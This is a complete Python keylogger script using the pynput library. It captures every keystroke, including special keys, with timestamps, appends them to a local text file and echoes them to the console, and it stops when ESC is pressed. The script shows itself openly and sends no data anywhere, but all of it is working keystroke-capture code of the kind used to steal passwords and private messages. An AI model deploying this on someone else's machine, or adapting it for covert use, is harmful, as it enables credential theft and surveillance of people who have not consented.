from pynput.keyboard import Listener, Key
import datetime

class Keylogger: 
     
    def __init__(self):
        self.log_file = "multiligne_log.txt"  # File to store the logs
        self.is_logging = False
        self.listener = None

    def write_to_log(self, key):
        """Log the key pressed to a file and print it to the console."""
        try:
            letter = key.char  # Get the character of the key pressed
        except AttributeError:
            # Handle special keys (shift,space,enter,etc...)
            if key == Key.space:
                letter = ' '
            elif key == Key.enter:
                letter = '\n'
            elif key == Key.backspace:
                letter = '[BACKSPACE]'
            elif key == Key.tab:
                letter = '[TAB]'
            elif key == Key.esc:
                letter = '[ESC]'
                # Stop the keylogger if ESC is pressed
                self.stop_logging()
                return False  # Stop the listener
            else:
                letter = f'[{str(key)}]'  # Log other special keys

        # Add a timestamp to the log entry
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {letter}"

        # Write the log entry to the file
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(log_entry + "\n")

        # Print the log entry to the console
        print(log_entry)

        return True

    def start_logging(self):
        """Start the keylogger"""
        if not self.is_logging:
            self.is_logging = True
            print("Keylogger started. Press ESC to stop")

            # Start the listener
            self.listener = Listener(on_press=self.write_to_log)
            self.listener.start()

    def stop_logging(self):
        """Stop the keylogger"""
        if self.is_logging:
            self.is_logging = False
            print("Keylogger stopped")

            # Stop the listener
            if self.listener:
                self.listener.stop()

if __name__ == "__main__":
    keylogger = Keylogger()

    # Start the keylogger
    keylogger.start_logging()

    # Keep the program running until the keylogger stops
    try:
        while keylogger.is_logging:
            pass
    except KeyboardInterrupt:
        # Stop the keylogger if the user interrupts the program
        keylogger.stop_logging()